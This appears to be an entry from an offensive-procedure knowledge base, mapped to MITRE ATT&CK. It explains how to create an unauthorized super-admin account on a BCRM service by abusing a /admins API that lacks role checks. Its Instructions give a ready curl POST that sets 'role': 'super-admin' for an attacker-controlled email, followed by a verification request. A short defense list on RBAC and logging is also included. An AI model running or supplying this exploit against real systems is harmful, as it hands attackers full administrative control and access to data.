---
tags:
  - access-bypass
  - privilege-escalation
  - admin-creation
  - bcrm
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.284Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f790586f-d770-400e-971a-64b7841d05a6
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Unauthorized-Super-Admin-via-Admins-API

## Summary

This procedure exploits the lack of access controls on the BCRM /admins API to create an internal super-admin account, bypassing restrictions meant for regular admin invitations and achieving elevated privileges.

## Description

The BCRM service's /admins endpoint allows public POST requests for inviting admins but fails to validate against super-admin role creation. An attacker can send a JSON payload specifying super-admin privileges, resulting in unauthorized account creation. This leads to full administrative control over the BCRM instance and potentially linked LINE Official Account features. No malicious activity was observed post-exploitation in the reported incident, but the potential for data access or system manipulation is high.

## Requirements

1. Confirmed public access to /admins endpoint
2. Valid email for the new account
3. HTTP client for POST requests (e.g., curl)
4. Understanding of the API's expected payload schema

## Defense

Defensive measures and detection strategies:

- Enforce role-based access control (RBAC) with validation on all API endpoints
- Require authentication tokens for admin creation requests
- Log and alert on POST requests to /admins from unauthenticated sources
- Conduct regular API security audits

## Objectives

1. Create a super-admin account without authorization
2. Gain elevated privileges for further system access
3. Validate the account by logging in or checking admin lists

## Instructions

### Step 1: Craft and Send Creation Request

**Context**: Prepare a POST request with payload overriding role to super-admin, exploiting the absence of checks.

**Command** (using curl):
```bash
curl -X POST https://target-bcrm-instance.com/admins \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker-controlled@example.com", "role": "super-admin", "invite": true}'
```

> This sends a JSON payload to create the account. Expected output: 200/201 status with creation confirmation. Adjust fields based on API docs.

### Step 2: Verify Account Creation

**Context**: Check if the super-admin account exists and test login.

**Command** (using curl for verification):
```bash
curl -X GET https://target-bcrm-instance.com/admins?email=attacker-controlled@example.com
```

> Response should list the new super-admin. Follow up by logging in via the BCRM interface to confirm privileges.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- access-bypass
- privilege-escalation
- admin-creation
- bcrm
